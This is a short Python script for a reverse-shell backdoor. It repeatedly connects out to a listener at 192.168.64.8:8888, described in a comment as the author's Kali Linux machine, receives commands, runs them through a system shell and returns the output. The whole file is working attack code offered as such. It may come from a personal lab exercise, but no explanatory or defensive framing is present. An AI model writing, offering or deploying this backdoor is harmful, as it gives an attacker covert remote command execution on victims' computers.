import socket
import json
import time
import subprocess
import os

SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
SERVER_PORT = 8888


def reliable_send(data):
    json_data = json.dumps(data)
    target_sock.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target_sock.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def connection():
    while True:
        time.sleep(20)
        try:
            target_sock.connect((SERVER_IP, SERVER_PORT))
            shell()
            target_sock.close()
            break
        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()